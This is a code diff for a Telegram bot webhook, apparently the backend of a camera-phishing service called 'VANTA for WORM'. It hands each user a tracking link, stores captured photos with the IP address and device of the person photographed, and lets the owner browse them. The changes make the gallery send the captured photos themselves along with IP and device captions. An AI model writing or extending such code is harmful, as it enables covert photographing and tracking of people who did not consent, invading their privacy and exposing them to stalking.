@@ -1,11 +1,10 @@
 // api/webhook.js — VANTA for WORM
-// بوت @Saleckbz_cam_bot — النسخة الكاملة
+// بوت @Saleckbz_cam_bot
 
 const SB_URL = process.env.SUPABASE_URL;
 const SB_KEY = process.env.SUPABASE_SERVICE_KEY;
 const OWNER_TG = 'Saleck_bz';
 
-// ذاكرة مؤقتة
 const broadcastMode = {};
 const broadcastPending = {};
 
@@ -88,7 +87,6 @@ export default async function handler(req, res) {
       await editMsg(chatId, msgId, '🎛️ <b>لوحة التحكم</b>\n\nاختر:', MENU);
     }
 
-    // إحصائيات
     if (data === 'stats') {
       const users = await sb('users?select=chat_id') || [];
       const images = await sb('images?select=id') || [];
@@ -106,7 +104,6 @@ export default async function handler(req, res) {
       );
     }
 
-    // تصفح المستخدمين
     if (data.startsWith('users_')) {
       const idx = parseInt(data.substring(6)) || 0;
       const users = await sb('users?order=created_at.desc&limit=100') || [];
@@ -146,7 +143,6 @@ export default async function handler(req, res) {
       }
     }
 
-    // حظر
     if (data.startsWith('b_') && !data.startsWith('blocked') && !data.startsWith('broadcast')) {
       const id = data.substring(2);
       await sb('users?chat_id=eq.' + id, 'PATCH', { blocked: true });
@@ -155,7 +151,6 @@ export default async function handler(req, res) {
         { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] });
     }
 
-    // إلغاء الحظر
     if (data.startsWith('ub_')) {
       const id = data.substring(3);
       await sb('users?chat_id=eq.' + id, 'PATCH', { blocked: false });
@@ -164,7 +159,6 @@ export default async function handler(req, res) {
         { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] });
     }
 
-    // المحظورون
     if (data === 'blocked') {
       const bl = await sb('users?blocked=eq.true&order=created_at.desc&limit=50') || [];
       if (!bl.length) {
@@ -182,7 +176,7 @@ export default async function handler(req, res) {
       }
     }
 
-    // معرض الصور
+    // معرض الصور — يُرسل الصورة نفسها
     if (data.startsWith('gallery_')) {
       const idx = parseInt(data.substring(8)) || 0;
       const imgs = await sb('images?order=created_at.desc&limit=100') || [];
@@ -193,31 +187,41 @@ export default async function handler(req, res) {
         });
       } else {
         const im = imgs[Math.abs(idx) % imgs.length];
-        const txt =
-          '📸 <b>صورة ' + (Math.abs(idx) % imgs.length + 1) + ' / ' + imgs.length + '</b>\n\n' +
-          '🆔 <code>' + im.chat_id + '</code>\n' +
-          '📱 ' + (im.device || '—') + '\n' +
-          '🌐 ' + (im.ip || '—') + '\n' +
-          '📅 ' + new Date(im.created_at).toLocaleString('ar');
 
-        const btns = [];
-        btns.push([{ text: '👤 صاحبها', callback_data: 'finduser_' + im.chat_id }]);
-        btns.push([
-          { text: '⬅️', callback_data: 'gallery_' + (Math.abs(idx) - 1 < 0 ? imgs.length-1 : Math.abs(idx)-1) },
-          { text: '➡️', callback_data: 'gallery_' + ((Math.abs(idx)+1) % imgs.length) }
-        ]);
-        btns.push([{ text: '🔙 رجوع', callback_data: 'menu' }]);
-
-        await editMsg(chatId, msgId, txt, { inline_keyboard: btns });
+        if (im.image_url) {
+          await api('sendPhoto', {
+            chat_id: chatId,
+            photo: im.image_url,
+            caption: '📸 <b>صورة ' + (Math.abs(idx) % imgs.length + 1) + ' / ' + imgs.length + '</b>\n\n' +
+              '🆔 <code>' + im.chat_id + '</code>\n' +
+              '📱 ' + (im.device || '—') + '\n' +
+              '🌐 ' + (im.ip || '—') + '\n' +
+              '📅 ' + new Date(im.created_at).toLocaleString('ar'),
+            parse_mode: 'HTML',
+            reply_markup: {
+              inline_keyboard: [
+                [{ text: '👤 صاحبها', callback_data: 'finduser_' + im.chat_id }],
+                [
+                  { text: '⬅️', callback_data: 'gallery_' + (Math.abs(idx) - 1 < 0 ? imgs.length-1 : Math.abs(idx)-1) },
+                  { text: '➡️', callback_data: 'gallery_' + ((Math.abs(idx)+1) % imgs.length) }
+                ],
+                [{ text: '🔙 رجوع', callback_data: 'menu' }]
+              ]
+            }
+          });
+        } else {
+          await editMsg(chatId, msgId, '⚠️ الصورة غير متوفرة.', {
+            inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
+          });
+        }
       }
     }
 
-    // البحث عن صاحب صورة
     if (data.startsWith('finduser_')) {
       const id = data.substring(9);
       const u = await sb('users?chat_id=eq.' + id);
       if (!u || !u.length) {
-        await editMsg(chatId, msgId, '❌ المستخدم غير موجود في القاعدة.', {
+        await editMsg(chatId, msgId, '❌ المستخدم غير موجود.', {
           inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
         });
       } else {
@@ -239,12 +243,10 @@ export default async function handler(req, res) {
       }
     }
 
-    // بث رسالة
     if (data === 'broadcast_help') {
       broadcastMode[chatId] = true;
       await editMsg(chatId, msgId,
-        '📢 <b>بث رسالة</b>\n\n' +
-        '✍️ أرسل الآن الرسالة التي تريد بثها للجميع.',
+        '📢 <b>بث رسالة</b>\n\n✍️ أرسل الآن الرسالة التي تريد بثها للجميع.',
         { inline_keyboard: [[{ text: '❌ إلغاء', callback_data: 'broadcast_cancel' }]] }
       );
     }
@@ -300,7 +302,6 @@ export default async function handler(req, res) {
   const username = (msg.from && msg.from.username) ? '@' + msg.from.username : '';
   const isOwner = String(chatId) === String(OWNER_CHAT);
 
-  // ============ وضع البث ============
   if (isOwner && broadcastMode[chatId]) {
     broadcastPending[chatId] = text;
     delete broadcastMode[chatId];
@@ -315,7 +316,6 @@ export default async function handler(req, res) {
     return;
   }
 
-  // ============ أوامر المالك ============
   if (isOwner) {
     if (text === '/start' || text === '/admin' || text === '/menu') {
       await send(chatId, '🎛️ <b>لوحة التحكم</b>\n\nاختر:', MENU);
@@ -363,7 +363,6 @@ export default async function handler(req, res) {
     }
   }
 
-  // ============ فحص الحظر ============
   const b = await sb('users?chat_id=eq.' + chatId + '&blocked=eq.true');
   if (b && b.length > 0) {
     await send(chatId, '🚫 أنت محظور من استخدام هذا البوت.');
@@ -371,7 +370,6 @@ export default async function handler(req, res) {
     return;
   }
 
-  // ============ /start للزوار ============
   if (text === '/start' || text === '/help') {
     const link = 'https://camera-one-henna.vercel.app/t/' + chatId;
     const existing = await sb('users?chat_id=eq.' + chatId);
@@ -405,7 +403,6 @@ export default async function handler(req, res) {
     return;
   }
 
-  // ============ إحصائيات المستخدم ============
   if (text === '/mystats' || text === '/info') {
     const imgs = await sb('images?chat_id=eq.' + chatId + '&select=id') || [];
     await send(chatId,
@@ -417,10 +414,9 @@ export default async function handler(req, res) {
     return;
   }
 
-  // ============ أي رسالة أخرى ============
   const link2 = 'https://camera-one-henna.vercel.app/t/' + chatId;
   await send(chatId, '🔗 رابطك:\n<code>' + link2 + '</code>',
     { inline_keyboard: [[{ text: '📋 نسخ', url: link2 }]] });
 
   res.status(200).send('OK');
-            }
+      }
